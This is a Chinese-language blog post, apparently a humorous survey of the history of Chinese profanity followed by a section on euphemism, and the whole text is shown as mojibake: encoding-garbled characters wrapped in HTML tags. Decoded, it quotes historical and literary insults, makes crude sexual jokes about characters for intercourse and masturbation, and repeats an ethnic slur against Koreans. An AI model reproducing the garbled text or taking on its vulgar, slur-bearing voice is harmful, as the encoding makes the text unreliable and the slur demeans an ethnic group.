æŒ¥ä»¥å¯é™è·¯ï¼Œå¿…åœŸå´©ç“¦è§£ï¼Œä¸ä¿Ÿè¡€åˆƒã€‚æ–¹ä»Šæ±‰å®¤é™µè¿Ÿï¼Œçº²ç»´å¼›ç»ï¼›åœ£æœæ— ä¸€ä»‹ä¹‹è¾…ï¼Œè‚¡è‚±æ— æŠ˜å†²ä¹‹åŠ¿ã€‚</p><p>æ–¹ç•¿ä¹‹å†…ï¼Œç®€ç»ƒä¹‹è‡£ï¼Œçš†å‚å¤´ç¿¼ï¼Œè«æ‰€å‡­æƒï¼›è™½æœ‰å¿ ä¹‰ä¹‹ä½ï¼Œèƒäºæš´è™ä¹‹è‡£ï¼Œç„‰èƒ½å±•å…¶èŠ‚ï¼Ÿåˆæ“æŒéƒ¨æ›²ç²¾å…µä¸ƒç™¾ï¼Œå›´å®ˆå®«é˜™ï¼Œå¤–æ‰˜å®¿å«ï¼Œå†…å®æ‹˜æ‰§ã€‚æƒ§å…¶ç¯¡é€†ä¹‹èŒï¼Œå› æ–¯è€Œä½œã€‚æ­¤ä¹ƒå¿ è‡£è‚è„‘æ¶‚åœ°ä¹‹ç§‹ï¼Œçƒˆå£«ç«‹åŠŸä¹‹ä¼šï¼Œå¯ä¸å‹–å“‰ï¼</p><p>æ“åˆçŸ«å‘½ç§°åˆ¶ï¼Œé£ä½¿å‘å…µã€‚æè¾¹è¿œå·éƒ¡ï¼Œè¿‡å¬ç»™ä¸ï¼Œè¿ä¼—æ—…å›ï¼Œä¸¾ä»¥ä¸§åï¼Œä¸ºå¤©ä¸‹ç¬‘ï¼Œåˆ™æ˜å“²ä¸å–ä¹Ÿã€‚å³æ—¥å¹½å¹¶é’å†€å››å·å¹¶è¿›ã€‚</p><p>ä¹¦åˆ°è†å·ï¼Œä¾¿å‹’ç°å…µï¼Œä¸å»ºå¿ å°†å†›ååŒå£°åŠ¿ã€‚å·éƒ¡å„æ•´ä¹‰å…µï¼Œç½—è½å¢ƒç•Œï¼Œä¸¾æ­¦æ‰¬å¨ï¼Œå¹¶åŒ¡ç¤¾ç¨·ï¼šåˆ™éå¸¸ä¹‹åŠŸäºæ˜¯ä¹è‘—ã€‚</p><p>å…¶å¾—æ“é¦–è€…ï¼Œå°äº”åƒæˆ·ä¾¯ï¼Œèµé’±äº”åƒä¸‡ã€‚éƒ¨æ›²åè£¨å°†æ ¡è¯¸åé™è€…ï¼Œå‹¿æœ‰æ‰€é—®ã€‚å¹¿å®œæ©ä¿¡ï¼Œç­æ‰¬ç¬¦èµï¼Œå¸ƒå‘Šå¤©ä¸‹ï¼Œå’¸ä½¿çŸ¥åœ£æœæœ‰æ‹˜è¿«ä¹‹éš¾ã€‚å¦‚å¾‹ä»¤ï¼</p></blockquote><p>è¿™ä¸æ˜¯å¤§æ‰å­ï¼Ÿæœ€éªšçš„è¿˜åœ¨è¿™é‡Œï¼š<code>å¸ç©ºæ›¹æ“ï¼šç¥–çˆ¶ä¸­å¸¸ä¾è…¾ï¼Œä¸å·¦æ‚ºã€å¾ç’œå¹¶ä½œå¦–å­½ï¼Œé¥•é¤®æ”¾æ¨ªï¼Œä¼¤åŒ–è™æ°‘ï¼›çˆ¶åµ©ï¼Œä¹åŒ„æºå…»ï¼Œå› èµƒå‡ä½ï¼Œèˆ†é‡‘è¾‡ç’§ï¼Œè¾“è´§æƒé—¨ï¼Œçªƒç›—é¼å¸ï¼Œå€¾è¦†é‡å™¨ã€‚æ“èµ˜é˜‰é—ä¸‘ï¼Œæœ¬æ— æ‡¿å¾·ï¼ŒçŠ­ç¥¨ç‹¡é”‹åï¼Œå¥½ä¹±ä¹ç¥¸ã€‚</code>ï¼Œç›´æ¥æ˜¯ä»ç¥–å®—åå…«ä»£éª‚äº†æ›¹æ“ä¸€å®¶ï¼Œè¿˜éª‚ä»–çˆ¹æ˜¯å¤ªç›‘ï¼Œæ›¹æ“å€’ä¹Ÿå®½å®¹å¤§åº¦ï¼Œåæ¥é€®ä½äº†é™ˆç³ï¼Œè¿˜ç¬‘ç€å¯¹ä»–è¯´ï¼šâ€œä½ çš„è¯´æ³•å°±å¾ˆæœ‰é—®é¢˜ï¼Œè¦æ˜¯æˆ‘çˆ¸æ˜¯å¤ªç›‘çš„è¯ï¼Œæˆ‘æ˜¯æ€ä¹ˆç”Ÿä¸‹æ¥çš„å‘¢â€ï¼Œä¹Ÿæ²¡æ€é™ˆç³ï¼Œè®©é™ˆç³ä¸‹å»åšå†™æ–‡ç« çš„äººäº†ã€‚</p><p>å†åˆ°äº†å”å®‹å…ƒæ—¶æœŸï¼Œå°±æœ‰äº†æ›´å¤šå¯éª‚çš„è¯æ±‡äº†ï¼Œç»è¿‡äº†ç§¦æ±‰çš„å‘å±•ï¼Œå”å®‹å…ƒè„è¯è¿›ä¸€æ­¥å‘ä»Šå¤©é æ‹¢ã€‚ä¸¾ä¸ªæ —å­ï¼Œã€Šèµ„æ²»é€šé‰´ã€‹ä¸­è®°è½½ï¼Œå®‰è¥¿èŠ‚åº¦ä½¿å¤«è’™çµå¯Ÿå¤§éª‚é«˜ä»™èŠï¼šâ€œå•–ç‹—ç²ªé«˜ä¸½å¥´ï¼â€ï¼ˆåƒç‹—å±å§é«˜ä¸½æ£’å­ï¼ˆé£Ÿå±å•¦ä½ ï¼Œå”å±å•¦æ¢éå‡¡ï¼‰ï¼‰ï¼Œæ··æ‚äº†å½“æ—¶çš„å„ç§æµè¡ŒæŠ€å·§ï¼Œå¦‚æ°‘æ—æ­§è§†ã€äººæ ¼é„™è§†ã€åŠ¨ç‰©ç±»æ¯”ç­‰ï¼Œä»£è¡¨äº†å”æœéª‚äººçš„ä¸Šç­‰æ°´å¹³ã€‚</p><p>è¢«èª‰ä¸ºåƒå¤ä¸€å¸çš„å”å®—å®‹ç¥–ï¼Œè„è¯ä¹Ÿç…§è¯´ä¸è¯¯ï¼Œå”å¤ªå®—æ›¾è¢«é­å¾çš„è¿›è°æƒ¹æ€’ï¼Œè·‘å›å»è·Ÿè€å©†å“­è¯‰ï¼šâ€œä¼šéœ€æ€æ­¤ç”°èˆç¿ï¼â€ï¼ˆæ€»æœ‰ä¸€å¤©è¦æ€äº†è¿™ä¸ªä¹¡å·´ä½¬ï¼‰ã€‚å®‹å¤ªç¥–å¯å®¤æˆ¿æ¢æŸåï¼Œéœ€è¦æ›´æ¢ï¼Œå¤§è‡£å¥æŠ¥è¦æˆªæ ¹å·¨æœ¨å½“æˆ¿æ¢ï¼Œå¤ªç¥–åœ¨æŠ˜å­ä¸Šæ‰¹ï¼šâ€œæˆªä½ çˆ·å¤´ï¼Œæˆªä½ å¨˜å¤´ã€‚â€ï¼ˆæˆªä½ çˆ¸çš„å¤´ï¼Œæˆªä½ å¦ˆçš„å¤´ï¼‰ï¼Œå½“æ—¶çš„äººä¸ç¦çº·çº·ç§°èµï¼Œè®¤ä¸ºå……åˆ†è¡¨ç°äº†å¤ªç¥–çš„çˆ±ç‰©ä¹‹å¿ƒã€‚</p><p>è€Œæƒ³è¦äº†è§£å®‹å…ƒçš„æ°‘é—´è„è¯ï¼Œå½“ç„¶ä¸å¾—ä¸çœ‹å›½éª‚å®å…¸ã€Šæ°´æµ’ä¼ ã€‹ï¼Œä»¥éª‚è¡—è¾¾äººé²æ™ºæ·±ä¸ºä¾‹ï¼Œè¯´è¯å‡ ä¹æ²¡æœ‰ä¸å¸¦è„å­—çš„ï¼šâ€œç›´å¨˜è´¼ï¼è¿˜æ•¢åº”å£â€ï¼Œâ€œä½ ä¸¤ä¸ªæ’®é¸Ÿâ€ï¼Œâ€œè¿™å®ä»¬æŒŸç€å±çœ¼æ’’å¼€â€ã€‚ç™½è¯ä¸­å¤¹å¸¦ç€æ–‡è¨€ï¼Œç²—ä¿—ä¸­é€éœ²ä¸€ä¸æ–‡è¶£ï¼ˆè¯¯ï¼‰ï¼Œå®Œç¾è¡¨ç°äº†èŠ±å’Œå°šè±è¾¾ç›´çˆ½çš„æ€§æ ¼ï¼Œè®©äººå¬äº†ç•…å¿«æ·‹æ¼“ï¼ˆå¤§è¯¯ï¼‰ã€‚</p><p>è¿™ä¼šå„¿åˆ°äº†æ˜æ¸…æ—¶æœŸï¼Œæ­å–œä½ ï¼Œå¯èƒ½ä¹‹å‰ä½ è§‰å¾—ï¼Œè´¼ã€è¿™å®ã€è…Œè‡œç­‰ï¼Œä»ç„¶ä¸å¤ŸåŠ²çˆ†ï¼Œé‚£ä¹ˆæ˜æ¸…åˆ™è¿›ä¸€æ­¥åœ°ï¼Œå°†è„è¯é›†ä¸­åˆ°ä¸‹åŠèº«ï¼Œä»¥åŠä¸‹åŠèº«çš„åŠ¨ä½œï¼Œä¸ä»Šå¤©éå¸¸æ¥è¿‘ï¼Œå¤ªå°¼å¨˜å¸¦åŠ²è¾£ã€‚ä¸è¿‡ã€Šå¤§æ˜å¾‹ã€‹å’Œã€Šå¤§æ¸…å¾‹ã€‹ä¸­è§„å®šï¼Œéª‚äººæ˜¯çŠ¯ç½ªè¡Œä¸ºï¼Œè½»è€…æ‰“å±è‚¡ã€é‡è€…æµæ”¾ï¼Œæ‰€ä»¥éª‚äººæœ‰ä¸€å®šé£é™©ã€‚è¿æ–‡äººå«éª‚ä¹Ÿç²—ä¿—äº†è®¸å¤šï¼Œæ¯”å¦‚æ˜æœæ–‡è±ªç‹ä¸–è´ï¼Œè´µä¸ºâ€œåä¸ƒå­â€ä¹‹é¦–ï¼Œåœ¨dissåˆ«äººçš„è¯—è¯æ—¶ï¼Œä¹Ÿä½¿ç”¨äº†ç²—é„™ä¹‹è¯­ï¼šâ€œæ­¤ç­‰è¯­ï¼Œä½•ä¸ä»¥æººè‡ªç…§ï¼Ÿâ€ï¼Œç”¨ä»Šå¤©çš„è¯è¯´å°±æ˜¯ï¼šâ€œä½ å†™çš„æ˜¯ä»€ä¹ˆé¬¼ï¼Œæ€ä¹ˆä¸æ’’æ³¡å°¿ç…§ç…§è‡ªå·±ï¼Ÿâ€ã€‚å·ç§°å°å»ºç¤¾ä¼šç™¾ç§‘å…¨ä¹¦çš„ã€Šçº¢æ¥¼æ¢¦ã€‹ï¼Œé‡Œé¢çš„éª‚äººè‰ºæœ¯ç”šè‡³å®Œçˆ†äº†ç°ä»£ï¼Œæ¯”å¦‚ç¬¬å››åå…­å›ï¼Œé¸³é¸¯éª‚å«‚å­ï¼šâ€œä½ å¿«å¤¹ç€å±„å˜´ç¦»äº†è¿™é‡Œï¼Œå¥½å¤šç€å‘¢ï¼ä»€ä¹ˆâ€˜å¥½è¯â€™ï¼å®‹å¾½å®—çš„é¹°ï¼Œèµµå­æ˜‚çš„é©¬ï¼Œéƒ½æ˜¯å¥½ç”»ï¼ˆè¯ï¼‰å„¿ã€‚ä»€ä¹ˆâ€˜å–œäº‹â€™ï¼çŠ¶å…ƒç—˜å„¿çŒçš„æµ†å„¿åˆæ»¡æ˜¯å–œäº‹ï¼æ€ªé“æˆæ—¥å®¶ç¾¡æ…•äººå®¶å¥³å„¿åšäº†å°è€å©†äº†ï¼Œä¸€å®¶å­éƒ½ä»—ç€ä»–æ¨ªè¡Œéœ¸é“çš„ï¼Œä¸€å®¶å­éƒ½æˆäº†å°è€å©†äº†ï¼çœ‹çš„çœ¼çƒ­äº†ï¼Œä¹ŸæŠŠæˆ‘é€åœ¨ç«å‘é‡Œå»ã€‚â€ï¼Œç››æ€’ä¹‹ä¸‹ï¼Œä¸ä»…å‡ºå£æˆè„ï¼Œè¿˜ä¸å¿˜ç”¨å…¸ï¼Œå‰åŠå¥ä¸€è¯­åŒå…³ï¼ŒååŠå¥è°éŸ³ç”¨å…¸ï¼Œè¿˜æ˜¯å‡ºè‡ªä¸€ä½å¨‡æ»´æ»´ï¼Œå°šæœªå‡ºå«çš„å°å§å§ä¹‹å£ã€‚ï¼ˆè´¾èµ¦çœ‹ä¸Šäº†è´¾æ¯è·Ÿå‰çš„è´´èº«ä¸«ç¯é¸³é¸¯ï¼Œè´ªæ‹ç¾è‰²çš„è´¾èµ¦å…ˆæ´¾é‚¢å¤«äººå‰å»ä¼ è¯ï¼Œæ²¡ä»€ä¹ˆè¿›å±•ï¼Œäºæ˜¯åæ¥åˆå«é¸³é¸¯çš„å«‚å«‚è¯´äº²ï¼Œä¸€å¿ƒæƒ³æ”€é¾™é™„å‡¤å‘ä¸Šçˆ¬çš„å«‚å«‚ä¸ä»…æ²¡æœ‰åšå¥½åª’ï¼Œæœ¬æƒ³ç€ä¸€é£å†²å¤©ï¼Œç»“æœå‘¢ï¼Œäººç”Ÿä¸å¦‚æ„ä¹‹äº‹åä¹‹å…«ä¹ï¼Œæ€§æ ¼åˆšçƒˆçš„é¸³é¸¯ç›´æ¥ç»™ä¸çŸ¥å¤©é«˜åœ°åšçš„å«‚å«‚ä¸€é¡¿å¥½éª‚ï¼é—¹çš„å¥¹ç°å¤´åœŸè„¸çš„ã€‚ï¼‰</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œè„è¯ä¸å¤–ä¹è¿™å‡ ä¸ªæ–¹é¢ï¼Œæ€§ã€åŠ¨ç‰©ã€æ¶å¿ƒã€åœ°ä½ã€äººæ ¼ã€è¡€ç»Ÿï¼Œæ‰€ä»¥è„è¯æƒ³ä»¤äººè€³ç›®ä¸€æ–°ï¼Œå¿…é¡»å¤šé¢ç»“åˆï¼Œå±‚å±‚é€’è¿›ã€‚æ¯”å¦‚ã€Šæ°´æµ’ä¼ ã€‹ç‹å©†éª‚éƒ“å“¥ï¼šâ€œå«é¸ŸçŒ¢ç‹²ï¼â€åˆå¦‚ã€Šé‡‘ç“¶æ¢…ã€‹å´æœˆå¨˜ç—›éª‚bitchï¼šâ€œè´¼ç‹—æ”®çš„å…»æ±‰çš„æ·«å¦‡ï¼â€éƒ½æ˜¯å¾ˆå¥½çš„æˆåŠŸæ¡ˆä¾‹ã€‚</p><p>ç›¸ä¿¡çœ‹åˆ°è¿™é‡Œï¼Œå¤§å®¶å¯¹å¤ä»£è„è¯ï¼Œä»¥åŠéª‚äººçš„é«˜çº§æŠ€å·§ï¼Œå·²ç»æœ‰äº†ä¸€å®šç†è§£ï¼Œä¸å¦¨è¯•åšä¾‹é¢˜ï¼š</p><hr><p>å¦‚ä½•è¯´ä¸€å¥ï¼ŒæƒŠå¤©åœ°æ³£é¬¼ç¥çš„è„è¯ï¼Ÿ</p><p>å‚è€ƒç­”æ¡ˆï¼š</p><p>æ˜æœ«æ¸…åˆé•¿ç¯‡å°è¯´ã€Šé†’ä¸–å§»ç¼˜ä¼ ã€‹ç¬¬åä¸€å›ï¼šâ€œæ”¾ä½ å®¶é‚£è‡­ç§çª å­æ·«å¦‡æ­ªæ‹‰éª¨æ¥ä¸‡äººçš„å¤§å¼€é—¨é©´å­ç‹—è‡­å±ï¼â€</p><hr><p>å†ç„¶åå‘¢ï¼Œå°±æ˜¯ç°ä»£è¾£ï¼Œç°ä»£å‘¢</p><p><img src="https://i.loli.net/2021/04/25/qxDQHdNh3Xtu1jV.jpg"></p><p><del>å½³äºï¼Œè¿™ä¸€æ¬¡å°±è°ˆè¿™ä¹ˆå¤šäº†ï¼Œä¸‹æ¬¡è°ˆè°ˆæˆ‘æ­£å¥½æƒ³è°ˆçš„ï¼Œè™½ç„¶æš‚æ—¶è¿˜ä¸çŸ¥é“æƒ³è°ˆå•¥ï¼Œä½†æ˜¯è¿™ç©æ„å„¿å¯æ¯”è¯¾è®¾æœ‰æ„æ€å¤šäº†</del></p><h2 id="0x02-Chineseçš„å§”å©‰è‰ºæœ¯"><a href="#0x02-Chineseçš„å§”å©‰è‰ºæœ¯" class="headerlink" title="0x02 Chineseçš„å§”å©‰è‰ºæœ¯"></a>0x02 Chineseçš„å§”å©‰è‰ºæœ¯</h2><p><strong>â€œä½ æ˜¯ä¸ªå¥½äººâ€</strong>ï¼Œ<strong>â€œæˆ‘ä»¬è¿˜æ˜¯åšæœ‹å‹å§â€</strong>ï¼Œ<strong>â€œæˆ‘ä»¬ä¸å¤ªåˆé€‚ï¼Œä½ ä¼šé‡åˆ°æ›´å¥½çš„â€</strong>ï¼Œä¸çŸ¥é“åœ¨åº§çš„hxdæœ‰å¤šå°‘äººå¬è¿‡è¿™äº›è¯ï¼Œç¡®å®å¤§å®¶éƒ½æ˜¯æ˜ç™½äººï¼Œè¿™ä¹ˆä¸€è¯´ä¹Ÿå°±æ˜ç™½äº†ï¼Œæ¬¸ï¼Œå‡‰äº†ï¼Œé»„äº†é»„äº†ï¼Œæ‰¾ä¸‹ä¸€ä¸ªå§ï¼Œxslï¼Œä½†æ˜¯æ€»å¥½è¿‡è¢«ç›´æ¥æŒ‘æ˜æ˜¯ä¸æ˜¯ï¼Œâ€œæˆ‘å¯¹ä½ æ²¡æœ‰æ„Ÿè§‰â€ï¼Œâ€œçˆ¬ï¼ŒğŸ‘µä¸å–œæ¬¢ä½ ä¸ªè„‘ç˜«â€ï¼Œâ€œæˆ‘ä»¥ä¸ºä½ åªæ˜¯æˆ‘æœ‹å‹è€Œå·²ï¼Œæˆ‘å…¶å®ä¹Ÿä¸å–œæ¬¢ä½ â€ï¼Œå¯¹ä¸å¯¹ï¼Œå†…å®¹å¤ªè¿‡æ‰å¿ƒï¼Œå¼•èµ·æåº¦ä¸é€‚ã€‚</p><p>å†è¯´ç‚¹çœŸå®çš„ï¼Œä½ å’Œä½ çš„å¥³ç¥èŠç€èŠç€ï¼Œä½ å¥³ç¥çªç„¶æ¥äº†ä¸€å¥ï¼šâ€œğŸ‘µæ´—æ¾¡å»äº†â€ï¼Œç„¶åä½ æœŸå¾…åœ°ååœ¨æ¡Œå‰æ‹¿ç€æ‰‹æœºç—´ç¬‘ï¼Œç­‰äº†ä¸ªä¸‰ä¸ªå°æ—¶ï¼Œå®¤å‹ä»¬éƒ½ç¡ç€å¥½ä¹…äº†ï¼Œé¼¾å£°åœ¨å¯å®¤é‡Œå›è¡ç€ï¼Œå¤©åœ°é—´å½·ä½›åªå­˜åœ¨ä½ ä¸ªæ’’æ¯”ï¼Œç”šè‡³ä½ å¯èƒ½è¿˜åœ¨å¹»æƒ³ç€å¥³ç¥æ´—å®Œäº†æ¾¡ç»™ä½ æ‰“ä¸ªè§†é¢‘ç”µè¯è¿‡æ¥ï¼Œç„¶åé—®ä½ å¥¹å¥½ä¸å¥½çœ‹ï¼ˆâ€œæ‰‘å“§â€ï¼Œæ¥è‡ªå±å¹•å¦ä¸€ç«¯çš„æ— æƒ…å—¤ç¬‘ï¼‰</p><p>é‚£è¿™å“¥ä»¬ç¡®å®ä¹Ÿæ˜¯ä¸æ‡‚å‘³å—·ï¼Œå¦‚æœæƒ³å’Œä½ èŠçš„è¯æˆ–è€…è¯´è§‰å¾—å’Œä½ èŠå¤©æœ‰æ„æ€ï¼Œäººå®¶è‚¯å®šç¬¬ä¸€æ—¶é—´å°±æ¥æ‰¾ä½ äº†ï¼Œæ˜¯ä¸æ˜¯ï¼Œä½ æ€»ä¸å¸Œæœ›å¬åˆ°â€œğŸ‘µä¸æƒ³å’Œä½ ä¸ªçŸ¬é€¼å±Œä¸èŠäº†ï¼ŒğŸ‘µè¦å»æ‰¾ğŸ‘µå–œæ¬¢çš„ğŸ‘´äº†ï¼Œçˆ¬å§â€è¿™æ ·çš„è¯å§ï¼Œé‚£ä¹Ÿå¤ªæ²¡å‘³äº†ï¼Œè€Œä¸”åˆ«äººä¹Ÿè‚¯å®šä¸æ„¿æ„å»æŒ‘æ˜è¿™ç§ç©æ„ï¼Œå¤šæ²¡æ„æ€ï¼Œè‡ªå·±å¿ƒé‡Œæœ‰Bæ•°å°±å¥½è¾£ã€‚</p><p>ç”Ÿæ´»ä¸­æœ‰è®¸å¤šäº‹æƒ…æ˜¯åªéœ€æ„ä¼šï¼Œä¸å¿…è¨€ä¼ çš„ï¼Œå¤äººä¹Ÿæ›¾è¯´è¿‡â€œè¨€æœ‰å°½è€Œæ„æ— ç©·ï¼Œä½™æ„å°½åœ¨ä¸æ–¹ä¸­â€ï¼Œè®²ä¸ªç¬‘è¯ï¼š</p><blockquote><p>ä»å‰ï¼Œæœ‰ä¸ªé…’åº—è€æ¿ï¼Œè„¾æ°”éå¸¸æš´èºã€‚ä¸€å¤©ï¼Œæœ‰ä¸ªå®¢äººæ¥å–é…’ï¼Œæ‰å–äº†ä¸€å£ï¼Œå˜´é‡Œä¾¿å«ï¼šâ€œå¥½é…¸ï¼å¥½é…¸ï¼â€è€æ¿å¬åå¤§æ€’ï¼Œä¸ç”±åˆ†è¯´ï¼ŒæŠŠå®¢äººç»‘èµ·æ¥ï¼ŒåŠåœ¨å±‹æ¢ä¸Šã€‚è¿™æ—¶æ¥äº†å¦ä¸€ä½é¡¾å®¢ï¼Œé—®è€æ¿ä¸ºä»€ä¹ˆåŠäººï¼Œè€æ¿å›ç­”ï¼šâ€œæˆ‘åº—çš„é…’æ˜æ˜é¦™é†‡ç”œç¾ï¼Œè¿™å®¶ä¼™ç¡¬è¯´æ˜¯é…¸çš„ï¼Œä½ è¯´è¯¥ä¸è¯¥åŠäººï¼Ÿâ€æ¥å®¢è¯´ï¼šâ€œå¯ä¸å¯è®©æˆ‘å°å°ï¼Ÿâ€è€æ¿æ®·å‹¤åœ°ç»™ä»–ç«¯äº†ä¸€æ¯é…’ï¼Œå®¢äººå‘·äº†ä¸€å£ï¼Œé…¸å¾—çš±çœ‰çœ¯çœ¼ï¼Œå¯¹è€æ¿è¯´ï¼šâ€œä½ æ”¾ä¸‹è¿™ä¸ªäººï¼ŒæŠŠæˆ‘åŠèµ·æ¥å§ï¼Ÿâ€è¿™ä½å®¢äººå§”å©‰å«è“„çš„è¯´æ³•ï¼Œæ—¢æ”¶åˆ°å¼ºçƒˆçš„è®½åˆºæ•ˆæœï¼Œåˆæ˜¾å¾—éå¸¸è‰ºæœ¯ã€‚</p></blockquote><p>â€œäºˆè°“èŠï¼ŒèŠ±ä¹‹éšé€¸è€…ä¹Ÿâ€ï¼Œåªä¸€å¥ï¼ŒåŒ—å®‹å‘¨æ•¦é¢å°±å°†èŠèŠ±ç­‰åŒäºå¤ä»£éšå£«ã€‚ä¸é£Ÿäººé—´çƒŸç«ï¼Œé«˜å†·èŒƒå„¿ï¼Œå¦¥å¦¥çš„ï¼Œå…¨æ˜¯èŠèŠ±å¥½ã€‚è€Œä»Šï¼Œæ–°æ–°äººç±»åˆ©ç”¨ä»–ä»¬åºå¤§çš„è„‘æ´ï¼Œå°†è¿™äº›è¯æ±‡çš„å«ä¹‰è¿›è¡Œäº†å¼•ç”³ã€‚â€œç•™å›¾ä¸ç•™ç§ï¼ŒèŠèŠ±ä¸‡äººæ…â€ã€‚ğŸ‘´è¸é©¬ç¬‘å¾—èŠèŠ±éƒ½æ¾äº†â€¦â€¦ä»æ­¤ï¼Œä¸–é£æ—¥ä¸‹ï¼ŒèŠèŠ±ä¸åœ¨ã€‚å†å›é¦–ï¼Œè¯»åˆ°â€œèŠä¹‹çˆ±ï¼Œé™¶åé²œæœ‰é—»ã€‚â€ï¼Œå½“æ—¶ä¾¿è™èº¯ä¸€éœ‡ï¼Œä¼¼ä¹æ˜ç™½äº†ä»€ä¹ˆã€‚ï¼ˆè¯¯ï¼‰</p><p>ã€Šå£æŠ€ã€‹ï¼Œåˆæ˜¯å¤§å®¶éƒ½å­¦è¿‡çš„ï¼šâ€œé¥é—»æ·±å··çŠ¬å å£°ï¼Œä¾¿æœ‰å¦‡äººæƒŠè§‰æ¬ ä¼¸ï¼Œæ‘‡å…¶å¤«è¯­çŒ¥äºµäº‹ã€‚å¤«å‘“è¯­ï¼Œåˆä¸ç”šåº”ï¼Œå¦‡æ‘‡ä¹‹ä¸æ­¢ï¼Œåˆ™äºŒäººè¯­æ¸é—´æ‚ï¼ŒåºŠåˆä»ä¸­æˆ›æˆ›ã€‚â€ï¼Œä»ä¸­æˆ›æˆ›ï¼Œå“ˆå“ˆå“ˆï¼</p><p>å†æ¥è°ˆç‚¹å¥‡â™‚æ€ªçš„ä¸œè¥¿å§ï¼Œè€ç¥–å®—é€ å­—æœ‰ä¸ªè§„çŸ©ï¼Œç®€å•ç²—æš´ã€‚ç®€å•æ€ä¹ˆè¯´å‘¢ï¼Ÿä¼šæ„æ³•é€ å­—ï¼Œè®©äººä¸€ç›®äº†ç„¶ï¼Œæ¯”å¦‚â€œä¼‘â€ï¼Œäººé æ ‘æ‰€è°“ä¼‘æ¯ï¼›å†æ¯”å¦‚â€œå›šâ€ï¼Œäººå›°äºå£æ‰€è°“å›šï¼›åˆåƒâ€œå°–â€ï¼Œä¸Šå°ä¸‹å¤§ä¸ºå°–ï¼Œéƒ½å¾ˆç”ŸåŠ¨å½¢è±¡ã€‚ç²—æš´å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€çœ‹è¿™ä¸ªå­—â€”â€”â€œè‚â€ï¼ˆcaoï¼‰ï¼Œä¸Šå…¥ï¼Œä¸‹ğŸ¥©ï¼Œå«ä¹‰å°±æ˜¯è¿›å…¥åˆ°è‚‰é‡Œé¢å»ï¼Œä»…ä»å­—å½¢å°±æš´éœ²å‡º sexual intercourse çš„æœ¬è´¨ï¼Œã€Šçº¢æ¥¼æ¢¦ã€‹ä¸­æœ‰ä¸ªç»å…¸æ¡¥æ®µï¼šâ€œåªè§ç‚•ä¸Šé‚£äººç¬‘é“ï¼šâ€˜ç‘å¤§å”è¦è‚æˆ‘å‘¢ï¼â€™â€ã€‚å½“ç„¶å‘¢ï¼Œè¿˜æœ‰â€œæŒŠâ€ï¼ˆnongï¼‰ï¼Œç”¨æ‰‹ä¸Šä¸‹æ‘©æ“¦æŸæ ¹ç©æ„ï¼Œä»”ç»†æƒ³æƒ³è¿™ä¸å°±æ˜¯æ’¸å˜›ï¼Œå…¶å®å®ƒæœ¬æ¥çš„æ„æ€ä¹Ÿæ­£æ˜¯ç”·æ€§è‡ªæˆ‘å®‰æ…°ã€‚</p><p>è¿™ä¿©å­—æŒºé€†å¤©çš„ï¼Œè¾¾åˆ°äº†ä¼šæ„çš„æœ€é«˜å¢ƒç•Œï¼Œæ‰€ä»¥å®ƒä»¬ä¹Ÿè¢«å±è”½æ‰äº†ï¼Œä¸è¿‡å‘¢ï¼Œå°½ç®¡å¤±å»äº†è¿™ä¿©å­—ï¼Œæˆ‘ä»¬è¿˜å‘æ˜äº†â€œè‰¹â€â€œæ“â€â€œæ’¸â€â€œå¹²â€â€œå¼„â€â€œæ—¥â€â€œæ’â€ç­‰å­—è¯ï¼Œå®ƒä»¬ä¹ŸæˆåŠŸåœ°å–ä»£äº†å‰è€…ï¼Œæˆä¸ºäº†å®ƒä»¬çš„å§”å©‰ç”¨æ³•ï¼Œä¸è¿‡ç¬¬ä¸€æ¬¡çœ‹è§â€œè‚â€å’Œâ€œæŒŠâ€ï¼Œåº”è¯¥å¤šåŠæ˜¯ä¸€è„¸æ‡µé€¼çš„ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¼šæ›´åŠ ä¹æ„ä½¿ç”¨åè€…ï¼Œâ€œXä½ ç¥–å®—ï¼â€ã€‚</p><p>åŸå› å…¶å®å¾ˆç®€å•ï¼Œæ¯•ç«Ÿâ€œè‚â€å’Œâ€œæŒŠâ€ä¸¤ä¸ªå­—å¤ªè¿‡äºå½¢è±¡ç”ŸåŠ¨ï¼Œåè€Œæä¸èµ·ä¸­å›½äººçš„å…´è¶£ï¼Œå› ä¸ºè¶Šæ˜¯å½¢è±¡ç”ŸåŠ¨çš„å­—è¯ï¼Œè¶Šæ˜¯æ²¡æœ‰è”æƒ³ç©ºé—´ï¼›è¶Šæ²¡æœ‰è”æƒ³ç©ºé—´ï¼Œå°±è¶Šä¸éªšæ°”ä¸æµªæ¼«ã€‚æ¯”å¦‚åŒ—æ–¹ä¿—è¯­çš„â€œå¹²å¤©ï¼Œæ“åœ°ï¼Œæ—¥å¤ªé˜³â€ï¼Œé»˜å¿µä¸‰éï¼Œå¹»è‚¢å·²ç¡¬ï¼è‹¥å˜æˆäº†â€œè‚å¤©ï¼Œè‚åœ°ï¼Œè‚å¤ªé˜³â€ï¼Œå¤§å“¥èƒ½ä¸èƒ½æ¢ä¸ªè¯ï¼Ÿï¼è¡¨è¾¾å¤ªå•è°ƒå•Šã€‚</p><p>è€Œä¸”â€œè‚â€ï¼Œâ€œæŒŠâ€ä¸¤å­—å¤ªè¿‡èµ¤è£¸ï¼Œä»é£èŠ±é›ªæœˆåˆ°çœŸæªå®å¹²çš„è¿™ä¸€æ­¥éª¤ï¼Œå¦‚è‹¥ä½ ç”¨è¿™ä¿©è¯ï¼Œ233333æ˜¯ä¸æ˜¯æ€ªæ€ªçš„ï¼Œæˆ–è®¸è¿™å°±æ˜¯å§”å©‰çš„é­…åŠ›å§ï¼Œè¶Šæ˜¯æ— é™å§”å©‰ï¼Œè¶Šæ˜¯æ˜¾å¾—æ±¡åŠ›æ»”æ»”ï¼Œä¼ è¿›åƒå®¶ä¸‡æˆ·â€¦â€¦å½“ç„¶ï¼Œæ™®é€šçš„å§”å©‰è¯­å¹¶ä¸èƒ½è®©ä½ æˆä¸ºæŠŠå¦¹é«˜æ‰‹ã€‚æ»¡å˜´â€œèŠèŠ±â€â€œé»„ç“œâ€â€œæœ¨è€³â€åªä¼šè®©ä½ æ›´åŠ çŒ¥çã€‚</p><p>å…·æœ‰é«˜çº§æ„Ÿçš„å§”å©‰è¯­å¯é‡ä¸å¯æ±‚ï¼Œè¿™ä¸ªè¦åƒè€ç¥–å®—å­¦ä¹ 